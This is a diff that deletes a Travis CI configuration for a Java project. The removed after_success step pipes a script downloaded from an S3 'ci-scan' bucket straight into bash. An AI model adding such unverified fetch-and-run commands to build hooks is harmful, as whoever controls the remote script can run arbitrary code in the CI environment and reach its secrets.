@@ -1,3 +1,0 @@
-﻿language: java
-after_success:
-- bash <(curl https://s3-ap-southeast-1.amazonaws.com/ci-scan/ff-starttravis.sh)
